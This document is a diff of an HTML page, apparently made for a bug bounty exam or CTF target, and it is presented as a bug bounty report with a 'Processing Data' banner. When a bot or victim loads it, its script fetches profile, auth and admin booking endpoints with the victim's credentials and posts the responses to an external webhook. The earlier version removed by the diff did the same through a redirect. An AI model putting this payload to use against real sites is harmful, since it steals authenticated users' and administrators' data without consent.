@@ -1,21 +1,43 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Bug Bounty Report - Analysis</title>
+</head>
 <body>
+    <h1>Processing Data... Please wait.</h1>
     <script>
-        async function leak() {
-            const webhook = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
-            const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";
+        const webhook = "https://webhooksite.net/11c8eb00-4696-43a0-9d10-5498131d321a";
 
-            try {
-                const res = await fetch(target, {credentials: "include"});
-                const data = await res.text();
-                // We encode the data so it doesn't break the URL
-                window.location.href = webhook + "?flag_data=" + btoa(data);
-            } catch (e) {
-                window.location.href = webhook + "?err=" + btoa(e.message);
+        async function exfiltrate() {
+            const targets = [
+                "https://api-bugbounty-exam.hashacademy.co/api/auth/profile",
+                "https://api-bugbounty-exam.hashacademy.co/api/auth/me",
+                "https://api-bugbounty-exam.hashacademy.co/api/admin/bookings"
+            ];
+
+            for (let url of targets) {
+                try {
+                    const res = await fetch(url, { credentials: 'include' });
+                    const data = await res.json();
+                    
+                    // Send captured data to your webhook
+                    await fetch(webhook, {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: JSON.stringify({
+                            endpoint: url,
+                            extracted_data: data
+                        })
+                    });
+                } catch (e) {
+                    // Log errors to debug if the bot hits a wall
+                    fetch(webhook + "?error=" + btoa(url + " : " + e.message));
+                }
             }
         }
-        leak();
+
+        // Execute immediately when the bot loads the page
+        exfiltrate();
     </script>
 </body>
 </html>
